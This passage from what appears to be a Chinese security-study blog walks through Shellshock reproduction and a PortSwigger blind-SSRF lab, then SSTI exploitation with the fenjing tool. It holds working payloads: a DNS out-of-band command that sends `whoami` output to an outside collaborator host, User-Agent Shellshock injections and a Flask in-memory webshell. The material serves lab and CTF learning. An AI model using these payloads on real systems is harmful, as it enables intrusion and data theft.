函数!&quot;</span><br>&#125;<br><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;-----函数开始执行-----&quot;</span><br>demoFun<br><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;-----函数执行完毕-----&quot;</span><br></code></pre></td></tr></table></figure><p>在<code>shell</code>中定义变量<br><code>springbird=&quot;hi&quot;</code></p><p>使用<code>echo</code>输出</p><p><a href="https://springbird.oss-cn-beijing.aliyuncs.com/blog20210105115013.png"><img src="https://springbird.oss-cn-beijing.aliyuncs.com/blog20210105115013.png"></a></p><p>然后开启以后新的进程后，可以看到<code>$springbird</code>变量没有继承到子进程中来<br>那么我们怎么样才能在子进程中使用父进程的变量呢？(自问自答)<br>可以将变量存储到环境变量中，这样就可以在父子进程中一起使用该变量了<br>我们使用<code>export</code>命令将其设置为环境变量，<code>export</code>简介：<a href="https://www.runoob.com/linux/linux-comm-export.html">https://www.runoob.com/linux/linux-comm-export.html</a></p><p>如图：</p><p><a href="https://springbird.oss-cn-beijing.aliyuncs.com/blog20210105115444.png"><img src="https://springbird.oss-cn-beijing.aliyuncs.com/blog20210105115444.png"></a></p><p>可以看到设置环境变量后子进程也能够使用该变量了</p><p>这个时候我们设置一个函数作为环境变量</p><p><code>x()&#123; echo &quot;test&quot;; &#125;</code></p><p>如图</p><p><a href="https://springbird.oss-cn-beijing.aliyuncs.com/blog20210105115653.png"><img src="https://springbird.oss-cn-beijing.aliyuncs.com/blog20210105115653.png"></a></p><p>可以看到子进程中也能成功执行该函数</p><p>这时候我们改变一点点<br>创建字符串环境变量<code>springbird</code><br><code>export springbird=&#39;() &#123; cat /etc/passwd;&#125;&#39;</code></p><p><a href="https://springbird.oss-cn-beijing.aliyuncs.com/blog20210105123724.png"><img src="https://springbird.oss-cn-beijing.aliyuncs.com/blog20210105123724.png"></a></p><p><strong>注意</strong>：</p><p><code>()</code>和<code>&#123;</code>之间有空格</p><p>可以看到我们创建的字符串变量被设置成环境变量后在子进程解释成了函数执行，成功读取了 <code>/etc/passwd</code></p><h3 id="阶段总结"><a href="#阶段总结" class="headerlink" title="阶段总结"></a>阶段总结</h3><p>把上面的操作合起来就是<code>env x=&#39;() &#123; echo accsessme;&#125;; echo vulnerable&#39; bash -c &#39;x&#39;</code><br><a href="https://springbird.oss-cn-beijing.aliyuncs.com/blog20210105124137.png"><img src="https://springbird.oss-cn-beijing.aliyuncs.com/blog20210105124137.png"></a></p><p>这里发生了以下步骤：</p><ol><li><code>env</code> 命令设置了一个名为 <code>x</code> 的环境变量，其值是一个函数定义，该函数输出 <code>accsessme</code>，然后是 <code>;</code> 分号和 <code>echo vulnerable</code>。</li><li><code>bash -c &#39;x&#39;</code> 命令启动一个新的 Bash 会话，并告诉它执行字符串 <code>&#39;x&#39;</code>。由于这是在命令行中，Bash 会首先解析 <code>x</code> 环境变量的值。</li><li>由于Shellshock漏洞，Bash 在解析环境变量时会错误地执行环境变量值中的函数定义。因此，<code>x</code> 环境变量被当作函数定义来执行，输出 <code>accsessme</code>。</li><li>然而，由于命令行解析的方式，<code>bash -c &#39;x&#39;</code> 这部分实际上首先执行了 <code>echo vulnerable</code> 命令。这是因为在命令行解析过程中，<code>-c &#39;x&#39;</code> 指定的字符串 <code>&#39;x&#39;</code> 被当作命令执行，而环境变量 <code>x</code> 的值被当作该命令的参数。</li><li>因此，<code>echo vulnerable</code> 首先执行，输出 <code>vulnerable</code>。</li><li>然后，由于环境变量 <code>x</code> 被设置为包含函数定义，Bash 尝试执行这个函数定义，输出 <code>accsessme</code>。</li></ol><p>所以，输出的顺序是 <code>vulnerable</code> 首先被输出，然后是 <code>accsessme</code>，这是因为命令行解析和执行的方式，以及Shellshock漏洞允许环境变量中的函数定义被执行。</p><p>触发并利用破壳漏洞的所需要的几点：</p><ul><li>被攻击的bash存在漏洞（版本小于等于4.3）</li><li>攻击者可以控制环境变量</li><li>新的bash进程被打开触发漏洞并执行命令</li></ul><p>从上面的分析中可以看出，漏洞的根本原因存在于Bash的ENV命令实现上，因此漏洞本身是不能够直接导致远程代码执行的。如果要达到远程代码执行的目的，必须借助第三方服务程序作为媒介才能够实现，第三方服务程序也必须要满足众多条件才可以充当此媒介的角色。</p><p>该<code>Bash</code>使用的环境变量是通过函数名称来调用的，导致漏洞出问题是以<code>()&#123;</code>开头定义的环境变量在命令<code>ENV</code>中解析成函数后，<code>Bash</code>执行并未退出，而是继续解析并执行shell命令。而其核心的原因在于在输入的过滤中没有严格限制边界，也没有做出合法化的参数判断。</p><h3 id="web漏洞检测"><a href="#web漏洞检测" class="headerlink" title="web漏洞检测"></a>web漏洞检测</h3><p><a href="https://www.cnblogs.com/Cl0ud/p/14248937.html">Bash 破壳漏洞Shellshock （CVE-2014-6271）复现分析 - 春告鳥 - 博客园 (cnblogs.com)</a><br>启动vulhub靶场—-Bash Shellshock 破壳漏洞（CVE-2012-6271）(搭建这个b玩意搞端口转发花了我一个多小时)<br>编译运行：</p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">docker compose up -d</span><br></code></pre></td></tr></table></figure><p>服务启动后，有两个页面<code>http://your-ip:8080/victim.cgi</code>和<code>http://your-ip:8080/safe.cgi</code>。其中safe.cgi是最新版bash生成的页面，victim.cgi是bash4.3生成的页面。</p><p>其中数据包原本是这样的<br><img src="/images/Pasted%20image%2020240611001752.png"></p><p>将payload附在User-Agent中访问victim.cgi：</p><figure class="highlight sqf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sqf">User-<span class="hljs-built_in">Agent</span>: () &#123; foo; &#125;; <span class="hljs-built_in">echo</span> Content-<span class="hljs-built_in">Type</span>: <span class="hljs-built_in">text</span>/plain; <span class="hljs-built_in">echo</span>; /usr/bin/id<br></code></pre></td></tr></table></figure><p>命令成功被执行：<br><img src="/images/Pasted%20image%2020240611003037.png"><br>同样的数据包访问safe.cgi，不受影响：<br><img src="/images/Pasted%20image%2020240611003107.png"></p><p>当然这个漏洞也可以执行别的命令比如说<code>cat /etc/passwd</code><br><img src="/images/Pasted%20image%2020240611003449.png"></p><h3 id="开始正题"><a href="#开始正题" class="headerlink" title="开始正题"></a>开始正题</h3><p>访问靶场<a href="https://portswigger.net/web-security/ssrf/blind/lab-shellshock-exploitation">Lab: Blind SSRF with Shellshock exploitation | Web Security Academy (portswigger.net)</a><br>靶场说, 该网站使用分析软件，当加载产品页面时，该软件会获取Referer标头中指定的URL。<br>所以我们要在referer头中插入我们想让它访问的网站, 也就是内部网络中<code>192.168.0.X:8080</code>的管理界面</p><p>当我们点击其中一个产品的时候抓取的数据包如下<br><img src="/images/Pasted%20image%2020240611005908.png"><br>在intruder模块中添加爆破ip地址(即192.168.0.1~192.168.0.254)<br><img src="/images/Pasted%20image%2020240611010031.png"><br><img src="/images/Pasted%20image%2020240611010056.png"><br>这里先不着急开始攻击</p><p>我们还要在UA中添加payload</p><p>由于这里没有回显, 所以使用DNS外带的方式</p><p><code>nslookup</code>命令可以请求一个域名<br>我们可以构造出这个命令<code>nslookup $(whoami).yuming.com</code><br>使用$(whoami)查询出当前的用户名, 如此一来, 用户名就会被拼接到后面的字符串中, 进而被我们查到DNS解析记录</p><p>启动burp的collaborator<br><img src="/images/Pasted%20image%2020240611010543.png"><br><img src="/images/Pasted%20image%2020240611010617.png"><br>即可获得一个域名<br>所以刚才那条命令就是<code>nslookup $(whoami).x97ikd34fj1pyvk8ka3q16b0lrrif83x.oastify.com</code><br>改成绝对路径<code>/usr/bin/nslookup $(whoami).x97ikd34fj1pyvk8ka3q16b0lrrif83x.oastify.com</code></p><p>再改造成payload<code>() &#123; :; &#125;; /usr/bin/nslookup $(whoami).x97ikd34fj1pyvk8ka3q16b0lrrif83x.oastify.com</code><br>拼接到刚才构造的那里<br><img src="/images/Pasted%20image%2020240611010923.png"><br>然后Start attack<br>回到collaborator模块<br><img src="/images/Pasted%20image%2020240611011846.png"><br>看到这里有两个DNS记录(本来就是1,2两条, 但是由于我多按了一次, 所以图片是4条)</p><p><code>The Collaborator server received a DNS ookup of type A for the domain name peter-hZ11Xr.x97ikd34fj1pyvk8ka3q16b0lrrif83x.oastify.com.</code></p><p>可以得到用户名就是域名前面的<code>peter-hZ11Xr</code></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title></title>
    <link href="/2024/09/23/%E6%BC%8F%E6%B4%9E-SSTI/"/>
    <url>/2024/09/23/%E6%BC%8F%E6%B4%9E-SSTI/</url>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>首先我们先讲解下什么是模板引擎，为什么需要模板？<br>模板引擎可以让（网站）程序实现界面与数据分离，业务代码与逻辑代码的分离，这大大提升了开发效率，良好的设计也使得代码重用变得更加容易。但是往往新的开发都会导致一些安全问题，虽然模板引擎会提供沙箱机制，但同样存在沙箱逃逸技术来绕过。</p><p>模板只是一种提供给程序来解析的一种语法，换句话说，模板是用于从数据（变量）到实际的视觉表现（HTML代码）这项工作的一种实现手段，而这种手段不论在前端还是后端都有应用。</p><p>后端渲染：浏览器会直接接收到经过服务器计算之后的呈现给用户的最终的HTML字符串，计算就是服务器后端经过解析服务器端的模板来完成的，后端渲染的好处是对前端浏览器的压力较小，主要任务在服务器端就已经完成。</p><p>前端渲染：前端渲染相反，是浏览器从服务器得到信息，可能是json等数据包封装的数据，也可能是html代码，他都是由浏览器前端来解析渲染成html的人们可视化的代码而呈现在用户面前，好处是对于服务器后端压力较小，主要渲染在用户的客户端完成。</p><p>正是因为有前端渲染和后端渲染, 所以有时候我们看到返回的数据包是整个的html代码<br><img src="/images/Pasted%20image%2020240918005926.png"></p><p>而有时候只有数据<br><img src="/images/Pasted%20image%2020240918010001.png"></p><h2 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h2><p><a href="https://hello-ctf.com/HC_Web/ssti/">SSTI 注入 - Hello CTF (hello-ctf.com)</a></p><h2 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h2><p><a href="https://www.cnblogs.com/bmjoker/p/13508538.html">1. SSTI（模板注入）漏洞（入门篇） - bmjoker - 博客园 (cnblogs.com)</a></p><h2 id="工具"><a href="#工具" class="headerlink" title="工具"></a>工具</h2><h3 id="tplmap"><a href="#tplmap" class="headerlink" title="tplmap"></a>tplmap</h3><p><a href="https://github.com/epinna/tplmap">epinna&#x2F;tplmap: Server-Side Template Injection and Code Injection Detection and Exploitation Tool (github.com)</a><br>碰到了两个issue<br><a href="https://github.com/epinna/tplmap/issues/104">module ‘collections’ has no attribute ‘Mapping’ · Issue #104 · epinna&#x2F;tplmap (github.com)</a><br><a href="https://github.com/epinna/tplmap/issues/103">‘bool’ object has no attribute ‘replace’ · Issue #103 · epinna&#x2F;tplmap (github.com)</a></p><h3 id="fenjing"><a href="#fenjing" class="headerlink" title="fenjing"></a>fenjing</h3><p><a href="https://github.com/Marven11/Fenjing">Marven11&#x2F;Fenjing: 专为CTF设计的Jinja2 SSTI全自动绕WAF脚本 | A Jinja2 SSTI cracker for bypassing WAF, designed for CTF (github.com)</a></p><h4 id="省流"><a href="#省流" class="headerlink" title="省流"></a>省流</h4><h5 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h5><p>他这个可能是python的库和可执行文件结合的一种东西</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs css"># 首先使用apt/dnf/pip/...安装pipx<br>pip install pipx<br># 然后用pipx自动创建独立的虚拟环境并进行安装<br>pipx install fenjing<br>fenjing webui<br># fenjing scan <span class="hljs-attr">--url</span> &#x27;http://xxxx:xxx<span class="hljs-string">&#x27;</span><br></code></pre></td></tr></table></figure><h5 id="使用-1"><a href="#使用-1" class="headerlink" title="使用"></a>使用</h5><p>windows<br>进入<code>C:\Users\lenovo\pipx\venvs\fenjing\Scripts</code><br>启动<code>active</code>激活虚拟环境<br><code>python -m fenjing crack-request --host challenge.basectf.fun --port 42395 --request-file .\req.txt</code><br>req.txt中放数据包, PAYLOAD就是它会攻击的地方</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/flag</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>challenge.basectf.fun:42395<br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>19<br><span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.5481.178 Safari/537.36<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>application/x-www-form-urlencoded<br><span class="hljs-attribute">Accept</span><span class="hljs-punctuation">: </span>*/*<br><span class="hljs-attribute">Origin</span><span class="hljs-punctuation">: </span>http://challenge.basectf.fun:42395<br><span class="hljs-attribute">Referer</span><span class="hljs-punctuation">: </span>http://challenge.basectf.fun:42395/<br><span class="hljs-attribute">Accept-Encoding</span><span class="hljs-punctuation">: </span>gzip, deflate<br><span class="hljs-attribute">Accept-Language</span><span class="hljs-punctuation">: </span>zh-CN,zh;q=0.9<br><span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>close<br><br><span class="language-abnf"><span class="hljs-attribute">flag</span><span class="hljs-operator">=</span>BaseCTF&#123;PAYLOAD&#125;</span><br></code></pre></td></tr></table></figure><h4 id="启动webui"><a href="#启动webui" class="headerlink" title="启动webui"></a>启动webui</h4><p>webui不支持自定义Headers和Cookie等特性，如果需要更灵活的使用方式请直接使用命令行或者作为库调用<br>执行<code>python -m fenjing webui</code>并访问<a href="http://127.0.0.1:11451/">http://127.0.0.1:11451</a>即可<br>指定host和port：<code>python -m fenjing webui --host &#39;127.0.0.1&#39; --port 1145</code></p><h4 id="作为命令行脚本使用"><a href="#作为命令行脚本使用" class="headerlink" title="作为命令行脚本使用"></a>作为命令行脚本使用</h4><p>扫描网站：<code>python -m fenjing scan --url &#39;http://xxx.xxx/&#39;</code></p><p>攻击对应的表单：</p><ul><li><code>python -m fenjing crack --url &#39;http://xxx.xxx&#39; --method GET --inputs name</code></li><li>也可以指定多个input：<code>python -m fenjing crack --url &#39;http://xxx.xxx&#39; --method GET --inputs name,email</code></li><li>指定攻击成功后执行的命令<ul><li>不指定则进入交互模式</li><li><code>python -m fenjing crack --url &#39;http://xxx.xxx&#39; --method GET --inputs name --exec-cmd &#39;ls /&#39;</code></li></ul></li></ul><p>攻击对应的路径：</p><ul><li><code>python -m fenjing crack-path --url &#39;http://xxx.xxx/hello/&#39;</code></li><li>只需要提供路径的前缀即可</li></ul><p>从文本文件中读取HTTP请求：</p><ul><li><code>python -m fenjing crack-request -f req.txt --host &#39;127.0.0.1&#39; --port 5000</code></li><li>需要提供HTTP请求文件的路径、目标的IP和端口</li></ul><p>通用设置</p><ul><li>指定请求间隔：<code>python -m fenjing crack --url &#39;http://xxx.xxx&#39; --method GET --inputs name --interval 0.1</code></li><li>指定请求时使用的UA：<code>python -m fenjing crack --url &#39;http://xxx.xxx&#39; --method GET --inputs name --user-agent &#39;Aaa/1.1&#39;</code></li><li>指定Header：<code>python -m fenjing crack --url &#39;http://xxx.xxx&#39; --method GET --inputs name --header &#39;Aaa: Bbb&#39; --header &#39;Ccc: Ddd&#39;</code></li><li>指定Cookie：<code>python -m fenjing crack --url &#39;http://xxx.xxx&#39; --method GET --inputs name --cookie &#39;name1=value1; name2=value2&#39;</code></li><li>指定代理：<code>python -m fenjing crack --url &#39;http://xxx.xxx&#39; --method GET --inputs name --proxy &#39;http://127.0.0.1:7890&#39;</code></li><li>指定额外的GET参数：<code>python -m fenjing crack --url &#39;http://xxx.xxx&#39; --method GET --inputs name --extra-params &#39;a=1&amp;b=2&#39;</code></li><li>指定额外的POST参数：<code>python -m fenjing crack --url &#39;http://xxx.xxx&#39; --method GET --inputs name --extra-data &#39;a=1&amp;b=2&#39;</code></li><li>指定分析模式<ul><li><code>--detect-mode</code>：检测模式，可为accurate或fast</li><li>示例：<code>python -m fenjing crack --url &#39;http://xxx.xxx&#39; --method GET --inputs name --detect-mode fast</code></li><li>在开始尝试触发WAF, 获取WAF页面对应hash时：<ul><li>accurate模式会一个接一个地发送尽可能多的payload</li><li>fast模式会将多个payload组合在一起发送，</li></ul></li><li>在生成payload时：<ul><li>accurate模式会先从最简单的方法试起</li><li>fast模式会先尝试使用复杂但通常更能绕过WAF的方法</li></ul></li></ul></li><li>指定WAF替换危险关键字时的行为：<ul><li>使用<code>--replaced-keyword-strategy</code>选项</li><li><code>avoid</code>: 避免使用会被WAF替换的关键字</li><li><code>doubletapping</code>: 进行双写（如<code>class</code>变成<code>clclassass</code>）</li><li><code>ignore</code>: 忽略，认为WAF不会对这些关键字做任何事</li><li><code>python -m fenjing crack --url &#39;http://xxx.xxx&#39; --method GET --inputs name --replaced-keyword-strategy doubletapping</code></li></ul></li><li>指定模板渲染环境<ul><li>使用<code>--environment</code>选项</li><li><code>flask</code>: （默认）模板在<code>render_template_string</code>等flask提供的函数中渲染，此时会使用<code>g</code>, <code>config</code>等flask提供的变量生成payload</li><li><code>jinja</code>: 模板使用jinja内置的<code>Template</code>编译并渲染，相关代码类似<code>Template(s).render()</code>，此时避免使用任何普通jinja环境之外提供的变量生成payload</li></ul></li></ul><h5 id="Tamper-Cmd的使用"><a href="#Tamper-Cmd的使用" class="headerlink" title="Tamper Cmd的使用"></a>Tamper Cmd的使用</h5><p>如果指定了<code>--tamper-cmd</code>参数，焚靖在每次提交payload时会使用指定的命令打开一个子进程，向这个子进程的标准输入传入payload, 并将子进程的输出作为编码后的结果进行提交。</p><p>例如：Linux中有一个命令行程序<code>base64</code>，它会从输入中读取内容，进行base64编码并输出</p><p>我们就可以使用<code>--tamper-cmd &#39;base64&#39;</code>指定使用这个命令编码payload</p><p>同样道理，<code>--tamper-cmd &#39;base64|rev&#39;</code>就是先进行base64编码再将内容反转</p><p>也可以使用python来自定义编码方式，例子如下：</p><p>先新建一个<code>encoder.py</code>，写入以下内容：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python">s = <span class="hljs-built_in">input</span>()<br><span class="hljs-built_in">print</span>(s[::-<span class="hljs-number">1</span>], end = <span class="hljs-string">&quot;&quot;</span>) <span class="hljs-comment"># 将payload反转</span><br></code></pre></td></tr></table></figure><p>然后指定<code>--tamper-cmd &#39;python encoder.py&#39;</code>就可以了</p><h5 id="crack-request的使用"><a href="#crack-request的使用" class="headerlink" title="crack-request的使用"></a>crack-request的使用</h5><p>crack-request可以实现从文本文件中读取请求并攻击</p><p>例如：使用burp suite拦截了这么一个请求</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/flag</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>xxx.com:45108<br><span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; rv:126.0) Gecko/20100101 Firefox/126.0<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>application/x-www-form-urlencoded<br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>10<br><span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>close<br><br><span class="language-abnf"><span class="hljs-attribute">flag</span><span class="hljs-operator">=</span><span class="hljs-number">11111</span></span><br></code></pre></td></tr></table></figure><p>payload通过POST参数<code>flag</code>提交，我们需要在payload的前面加上一些字符（比如说<code>aaa</code>），从而满足题目要求，通过WAF.</p><p>这里可以打开记事本将请求复制粘贴到<code>req.txt</code>中，然后将<code>flag=11111</code>改成<code>flag=aaaPAYLOAD</code>，这样，fenjing就会在提交请求的时候将<code>PAYLOAD</code>换成实际的payload并提交。</p><p>改好之后<code>req.txt</code>长这样</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/flag</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>xxx.com:45108<br><span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; rv:126.0) Gecko/20100101 Firefox/126.0<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>application/x-www-form-urlencoded<br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>10<br><span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>close<br><br><span class="language-abnf"><span class="hljs-attribute">flag</span><span class="hljs-operator">=</span>aaaPAYLOAD</span><br><span class="language-abnf"></span><br></code></pre></td></tr></table></figure><p>写好<code>req.txt</code>之后运行<code>python -m fenjing crack-request --host xxx.com --port 45108 --request-file ./req.txt</code>就可以根据<code>req.txt</code>攻击<code>xxx.com:45108</code>了</p><h4 id="作为库使用"><a href="#作为库使用" class="headerlink" title="作为库使用"></a>作为库使用</h4><h5 id="打内存马"><a href="#打内存马" class="headerlink" title="打内存马"></a>打内存马</h5><p>这里以Flask内存马为例</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> fenjing<br><span class="hljs-keyword">import</span> requests<br><br><span class="hljs-comment"># 这个内存马会获取GET参数cmd并执行，然后在header Aaa中返回</span><br>payload = <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">[</span><br><span class="hljs-string">    app.view_functions</span><br><span class="hljs-string">    for app in [ __import__(&#x27;sys&#x27;).modules[&quot;__main__&quot;].app ]</span><br><span class="hljs-string">    for c4tchm3 in [</span><br><span class="hljs-string">        lambda resp: [</span><br><span class="hljs-string">            resp</span><br><span class="hljs-string">            for cmd_result in [__import__(&#x27;os&#x27;).popen(__import__(&#x27;__main__&#x27;).app.jinja_env.globals[&quot;request&quot;].args.get(&quot;cmd&quot;, &quot;id&quot;)).read()]</span><br><span class="hljs-string">            if [</span><br><span class="hljs-string">                resp.headers.__setitem__(&quot;Aaa&quot;, __import__(&quot;base64&quot;).b64encode(cmd_result.encode()).decode()),</span><br><span class="hljs-string">                print(resp.headers[&quot;Aaa&quot;])</span><br><span class="hljs-string">            ]</span><br><span class="hljs-string">        ][0]</span><br><span class="hljs-string">    ]</span><br><span class="hljs-string">    if [</span><br><span class="hljs-string">        app.__dict__.update(&#123;&#x27;_got_first_request&#x27;:False&#125;),</span><br><span class="hljs-string">        app.after_request_funcs.setdefault(None, []).append(c4tchm3)</span><br><span class="hljs-string">    ]</span><br><span class="hljs-string">]</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">waf</span>(<span class="hljs-params">s</span>):<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;/&quot;</span> <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> s<br><br><br>full_payload_gen = fenjing.FullPayloadGen(waf)<br>payload, will_print = full_payload_gen.generate(fenjing.const.EVAL, (fenjing.const.STRING, payload))<br><span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> will_print:<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;这个payload不会产生回显&quot;</span>)<br><span class="hljs-built_in">print</span>(payload)<br><br><span class="hljs-comment"># 生成payload后在这里打上去</span><br>r = requests.get(<span class="hljs-string">&quot;http://127.0.0.1:5000/&quot;</span>, params = &#123;<br>    <span class="hljs-string">&quot;name&quot;</span>: payload<br>&#125;)<br><br><span class="hljs-built_in">print</span>(r.text)<br><span class="hljs-comment"># 然后使用`?cmd=whoami`就可以在header里看到命令执行结果了</span><br></code></pre></td></tr></table></figure><p>也可以这样直接给定表达式而不是给定字符串的值</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> fenjing<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">waf</span>(<span class="hljs-params">s</span>):<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;/&quot;</span> <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> s<br><br>full_payload_gen = fenjing.FullPayloadGen(waf)<br>payload, will_print = full_payload_gen.generate(fenjing.const.EVAL, (fenjing.const.LITERAL, <span class="hljs-string">&#x27;&quot;1&quot;+&quot;2&quot;&#x27;</span>))<br><span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> will_print:<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;这个payload不会产生回显&quot;</span>)<br><span class="hljs-built_in">print</span>(payload)<br></code></pre></td></tr></table></figure><h5 id="根据WAF函数生成shell指令对应的payload"><a href="#根据WAF函数生成shell指令对应的payload" class="headerlink" title="根据WAF函数生成shell指令对应的payload"></a>根据WAF函数生成shell指令对应的payload</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> fenjing <span class="hljs-keyword">import</span> exec_cmd_payload, config_payload<br><span class="hljs-keyword">import</span> logging<br>logging.basicConfig(level = logging.INFO)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">waf</span>(<span class="hljs-params">s: <span class="hljs-built_in">str</span></span>): <span class="hljs-comment"># 如果字符串s可以通过waf则返回True, 否则返回False</span><br>    blacklist = [<br>        <span class="hljs-string">&quot;config&quot;</span>, <span class="hljs-string">&quot;self&quot;</span>, <span class="hljs-string">&quot;g&quot;</span>, <span class="hljs-string">&quot;os&quot;</span>, <span class="hljs-string">&quot;class&quot;</span>, <span class="hljs-string">&quot;length&quot;</span>, <span class="hljs-string">&quot;mro&quot;</span>, <span class="hljs-string">&quot;base&quot;</span>, <span class="hljs-string">&quot;lipsum&quot;</span>,<br>        <span class="hljs-string">&quot;[&quot;</span>, <span class="hljs-string">&#x27;&quot;&#x27;</span>, <span class="hljs-string">&quot;&#x27;&quot;</span>, <span class="hljs-string">&quot;_&quot;</span>, <span class="hljs-string">&quot;.&quot;</span>, <span class="hljs-string">&quot;+&quot;</span>, <span class="hljs-string">&quot;~&quot;</span>, <span class="hljs-string">&quot;&#123;&#123;&quot;</span>,<br>        <span class="hljs-string">&quot;0&quot;</span>, <span class="hljs-string">&quot;1&quot;</span>, <span class="hljs-string">&quot;2&quot;</span>, <span class="hljs-string">&quot;3&quot;</span>, <span class="hljs-string">&quot;4&quot;</span>, <span class="hljs-string">&quot;5&quot;</span>, <span class="hljs-string">&quot;6&quot;</span>, <span class="hljs-string">&quot;7&quot;</span>, <span class="hljs-string">&quot;8&quot;</span>, <span class="hljs-string">&quot;9&quot;</span>,<br>        <span class="hljs-string">&quot;０&quot;</span>,<span class="hljs-string">&quot;１&quot;</span>,<span class="hljs-string">&quot;２&quot;</span>,<span class="hljs-string">&quot;３&quot;</span>,<span class="hljs-string">&quot;４&quot;</span>,<span class="hljs-string">&quot;５&quot;</span>,<span class="hljs-string">&quot;６&quot;</span>,<span class="hljs-string">&quot;７&quot;</span>,<span 